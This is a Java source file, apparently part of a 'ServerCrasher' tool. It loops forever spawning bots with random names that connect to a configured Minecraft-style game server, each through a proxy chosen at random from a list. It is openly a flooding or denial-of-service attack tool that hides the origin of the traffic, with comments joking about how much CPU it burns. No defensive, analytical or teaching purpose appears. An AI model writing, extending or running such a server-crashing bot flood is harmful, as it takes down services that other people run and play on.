package xyz.zihaoxu;

import com.github.steveice10.packetlib.ProxyInfo;
import xyz.zihaoxu.Listeners.Listener;
import xyz.zihaoxu.protocol.Bot;
import xyz.zihaoxu.utils.Utils;

import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.util.Random;

public class AttackThread implements Runnable{ // AttackThread
    @Override
    public void run() {
        while (true){
            try {
                String nickname= Utils.generate_random_name(ServerCrasher.configure.name_prefix);
                // String name = Configure.generateRandomName(Configure.name_prefix);
                System.out.println(nickname+" Creating");
                ProxyInfo proxy=null;
                if(Utils.proxies !=null){ // 这里是随机抽取一位幸运代理
                    String proxy_addr= Utils.proxies.get(new Random().nextInt(Utils.proxies.size()));
                    proxy=new ProxyInfo(
                            ProxyInfo.Type.valueOf(ServerCrasher.configure.proxy_type.toUpperCase()),
                            new InetSocketAddress(
                                    proxy_addr.split(":")[0],
                                    Integer.parseInt(proxy_addr.split(":")[1])
                            )
                    );
                }
                Bot bot=new Bot( // Bot bot=new Bot(
                        ServerCrasher.configure.host, // Configure.host,
                        ServerCrasher.configure.port, // Configure.port,
                        nickname, // name,
                        proxy // proxy_info
                );
                if (!ServerCrasher.configure.should_add_listener){
                    bot.addListener(new Listener(bot.getScript(),nickname)); // bot.addListener(new Listener());
                }
                bot.run(); // bot.connect();
//                while (bot.client.isConnected()){
//
//                }
                bot.client =null;
                // System.gc(); // 看到这里的应该知道为什么我说烧cpu了
                Thread.sleep(1000);
                bot=null;
            } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | NoSuchMethodException |
                     InvocationTargetException | InterruptedException e) {
                throw new RuntimeException(e); // 我觉得这个东西属于多余
            }
        }
    }
}